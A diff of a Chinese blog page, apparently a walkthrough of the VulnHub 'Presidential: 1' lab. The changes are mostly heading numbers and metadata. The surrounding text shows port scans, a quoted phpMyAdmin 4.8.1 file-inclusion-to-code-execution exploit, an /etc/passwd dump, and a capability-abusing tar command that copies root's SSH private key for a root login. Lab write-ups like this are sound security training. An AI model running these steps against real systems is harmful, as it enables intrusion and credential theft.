@@ -41,7 +41,7 @@
 <meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220506225201.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220506225636.png">
 <meta property="article:published_time" content="2022-05-05T16:00:00.000Z">
-<meta property="article:modified_time" content="2022-05-06T15:01:26.710Z">
+<meta property="article:modified_time" content="2022-05-07T03:07:10.836Z">
 <meta property="article:author" content="hdfzzf">
 <meta property="article:tag" content="综合">
 <meta property="article:tag" content="vulnhub">
@@ -165,7 +165,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%9D%B6%E6%9C%BA%E4%BF%A1%E6%81%AF"><span class="nav-text">靶机信息</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%B8%97%E9%80%8F"><span class="nav-text">渗透</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E7%AB%AF%E5%8F%A3%E6%9C%8D%E5%8A%A1%E5%8F%91%E7%8E%B0"><span class="nav-text">主机发现、端口扫描、端口服务发现</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%AE%BF%E9%97%AEhttp%E6%9C%8D%E5%8A%A1"><span class="nav-text">访问http服务</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#get-shell"><span class="nav-text">get shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="nav-text">权限提升</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-text">总结</span></a></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%9D%B6%E6%9C%BA%E4%BF%A1%E6%81%AF"><span class="nav-text">1. 靶机信息</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%B8%97%E9%80%8F"><span class="nav-text">2. 渗透</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E7%AB%AF%E5%8F%A3%E6%9C%8D%E5%8A%A1%E5%8F%91%E7%8E%B0"><span class="nav-text">2.1. 主机发现、端口扫描、端口服务发现</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%AE%BF%E9%97%AEhttp%E6%9C%8D%E5%8A%A1"><span class="nav-text">2.2. 访问http服务</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#get-shell"><span class="nav-text">2.3. get shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="nav-text">2.4. 权限提升</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-text">3. 总结</span></a></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -180,18 +180,18 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">80</span>
+          <span class="site-state-item-count">85</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
           <a href="/categories/">
-        <span class="site-state-item-count">11</span>
+        <span class="site-state-item-count">10</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">133</span>
+        <span class="site-state-item-count">149</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -262,9 +262,15 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">发表于</span>
-      
 
-      <time title="创建时间：2022-05-06 00:00 / 修改时间：23:01" itemprop="dateCreated datePublished" datetime="2022-05-06T00:00:00+08:00">2022-05-06</time>
+      <time title="创建时间：2022-05-06 00:00" itemprop="dateCreated datePublished" datetime="2022-05-06T00:00:00+08:00">2022-05-06</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2022-05-07 11:07" itemprop="dateModified" datetime="2022-05-07T11:07:10+08:00">2022-05-07</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -304,14 +310,14 @@
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">本文字数：</span>
-      <span>4.9k</span>
+      <span>5k</span>
     </span>
     <span class="post-meta-item" title="阅读时长">
       <span class="post-meta-item-icon">
         <i class="far fa-clock"></i>
       </span>
       <span class="post-meta-item-text">阅读时长 &asymp;</span>
-      <span>4 分钟</span>
+      <span>5 分钟</span>
     </span>
 </div>
 
@@ -324,7 +330,7 @@
     <div class="post-body" itemprop="articleBody">
         <p>该靶机难度中等，感觉比较常规，虽然我也是看了writeup才最终做出来的。</p>
 <span id="more"></span>
-<h1 id="靶机信息">靶机信息</h1>
+<h1 id="靶机信息">1. 靶机信息</h1>
 <p>靶机地址：</p>
 <ul>
 <li><a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/presidential-1,500/">Presidential: 1 ~ VulnHub</a></li>
@@ -346,12 +352,12 @@
 <li><strong>Capabilities</strong></li>
 <li>SSH公钥认证</li>
 </ul>
-<h1 id="渗透">渗透</h1>
-<h2 id="主机发现端口扫描端口服务发现">主机发现、端口扫描、端口服务发现</h2>
+<h1 id="渗透">2. 渗透</h1>
+<h2 id="主机发现端口扫描端口服务发现">2.1. 主机发现、端口扫描、端口服务发现</h2>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">sudo nmap -p- 10.0.2.29</span><br><span class="line">sudo nmap -p80,2082 -A 10.0.2.29</span><br></pre></td></tr></table></figure>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220506220805.png" /></p>
 <p>这里比较异常的是ssh没在22端口，而是在2082端口。</p>
-<h2 id="访问http服务">访问http服务</h2>
+<h2 id="访问http服务">2.2. 访问http服务</h2>
 <p>进入网站，映入眼帘的就是美国2020总统大选</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220506220922.png" /></p>
 <p>注意左上角邮箱那存在域名，<strong>而在靶机中，出现域名，一般都会使用到，并且很大概率需要进行子域名扫描</strong>，因此，先将该域名加入/etc/hosts。</p>
@@ -371,7 +377,7 @@
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220506221925.png" /></p>
 <p>我首先尝试了一下RCE，但是没有任何反应，接下来尝试第二个，txt内容如下： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># Exploit Title: phpMyAdmin 4.8.1 - Local File Inclusion to Remote Code Execution</span><br><span class="line"># Date: 2018-06-21</span><br><span class="line"># Exploit Author: VulnSpy</span><br><span class="line"># Vendor Homepage: http://www.phpmyadmin.net</span><br><span class="line"># Software Link: https://github.com/phpmyadmin/phpmyadmin/archive/RELEASE_4_8_1.tar.gz</span><br><span class="line"># Version: 4.8.0, 4.8.1</span><br><span class="line"># Tested on: php7 mysql5</span><br><span class="line"># CVE : CVE-2018-12613</span><br><span class="line"></span><br><span class="line">1. Run SQL Query : select &#x27;&lt;?php phpinfo();exit;?&gt;&#x27;</span><br><span class="line">2. Include the session file :</span><br><span class="line">http://1a23009a9c9e959d9c70932bb9f634eb.vsplate.me/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_11njnj4253qq93vjm9q93nvc7p2lq82k</span><br></pre></td></tr></table></figure></p>
 <p>简单来说就是phpmyadmin的4.8.1存在本地文件包含，利用该漏洞包含session文件，然后get shell。</p>
-<h2 id="get-shell">get shell</h2>
+<h2 id="get-shell">2.3. get shell</h2>
 <p>首先，先执行sql语句： <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">&#x27;&lt;?php phpinfo();exit;?&gt;&#x27;</span></span><br></pre></td></tr></table></figure></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220506222156.png" /></p>
 <p>然后查看session的值（在cookie里面）</p>
@@ -386,7 +392,7 @@
 <p>如果直接在后面输入index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/session/sess_vh95pitq4hv51ijj1b6g83o8afetposj则可以反弹；但是如果把域名都加进去则不行，此时需要重新登录刷新一下session，然后再次执行sql语句，接着包含session文件。</p>
 </blockquote>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220506223218.png" /></p>
-<h2 id="权限提升">权限提升</h2>
+<h2 id="权限提升">2.4. 权限提升</h2>
 <p>查看/etc/passwd <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">bin:x:1:1:bin:/bin:/sbin/nologin</span><br><span class="line">daemon:x:2:2:daemon:/sbin:/sbin/nologin</span><br><span class="line">adm:x:3:4:adm:/var/adm:/sbin/nologin</span><br><span class="line">lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin</span><br><span class="line">sync:x:5:0:sync:/sbin:/bin/sync</span><br><span class="line">shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown</span><br><span class="line">halt:x:7:0:halt:/sbin:/sbin/halt</span><br><span class="line">mail:x:8:12:mail:/var/spool/mail:/sbin/nologin</span><br><span class="line">operator:x:11:0:operator:/root:/sbin/nologin</span><br><span class="line">games:x:12:100:games:/usr/games:/sbin/nologin</span><br><span class="line">ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin</span><br><span class="line">nobody:x:99:99:Nobody:/:/sbin/nologin</span><br><span class="line">systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin</span><br><span class="line">dbus:x:81:81:System message bus:/:/sbin/nologin</span><br><span class="line">polkitd:x:999:998:User <span class="keyword">for</span> polkitd:/:/sbin/nologin</span><br><span class="line">sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin</span><br><span class="line">postfix:x:89:89::/var/spool/postfix:/sbin/nologin</span><br><span class="line">chrony:x:998:996::/var/lib/chrony:/sbin/nologin</span><br><span class="line">apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin</span><br><span class="line">admin:x:1000:1000::/home/admin:/bin/bash</span><br><span class="line">mysql:x:27:27:MariaDB Server:/var/lib/mysql:/sbin/nologin</span><br></pre></td></tr></table></figure></p>
 <p>看到了admin，想到刚刚还破解了密码，但无法ssh登录，尝试直接切换用户</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220506223922.png" /></p>
@@ -405,13 +411,14 @@
 <p>接着又思考了一下，想到了ssh只允许公钥认证登录，因此只要我们有/root/.ssh/id_rsa就可以登录。（并不知道是否存在，只是尝试） <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1. <span class="built_in">cd</span> ~</span><br><span class="line">2. tarS -cvf s.tar /root/.ssh/id_rsa</span><br><span class="line">3. tarS -xvf s.tar</span><br><span class="line">4. <span class="built_in">cd</span> root/.ssh</span><br><span class="line">5. chmod 600 id_rsa</span><br><span class="line">6. ssh root@<span class="built_in">local</span> -i id_rsa -p 2082</span><br></pre></td></tr></table></figure></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220506225636.png" /></p>
 <p>最后，读取2个flag： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">1. /home/admin/user.txt</span><br><span class="line">663ba6a402a57536772c6118e8181570</span><br><span class="line"></span><br><span class="line">2. /root/root-final-flag.txt</span><br><span class="line">Congratulations on getting root.</span><br><span class="line"></span><br><span class="line"> _._     _,-&#x27;&quot;&quot;`-._</span><br><span class="line">(,-.`._,&#x27;(       |\`-/|</span><br><span class="line">    `-.-&#x27; \ )-`( , o o)</span><br><span class="line">          `-    \`_`&quot;&#x27;-</span><br><span class="line"></span><br><span class="line">This CTF was created by bootlesshacker - https://security.caerdydd.wales</span><br><span class="line"></span><br><span class="line">Please visit my blog and provide feedback - I will be glad to hear from you.</span><br></pre></td></tr></table></figure></p>
-<h1 id="总结">总结</h1>
+<h1 id="总结">3. 总结</h1>
 <p>通过该靶机的渗透，我总结了提权的时候查看的顺序：</p>
 <ol type="1">
 <li>/etc/passwd -&gt; 看用户</li>
 <li>uname -a -&gt; 看内核、版本</li>
 <li>sudo -l</li>
 <li>suid</li>
+<li>查看.bash_history</li>
 <li>查看进程、端口</li>
 <li>capabilities</li>
 <li>其他</li>
@@ -481,14 +488,14 @@
       <i class="fa fa-chart-line"></i>
     </span>
       <span>站点总字数：</span>
-    <span title="站点总字数">353k</span>
+    <span title="站点总字数">332k</span>
   </span>
   <span class="post-meta-item">
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
       <span>站点阅读时长 &asymp;</span>
-    <span title="站点阅读时长">5:21</span>
+    <span title="站点阅读时长">5:02</span>
   </span>
 </div>
 <div class="busuanzi-count">
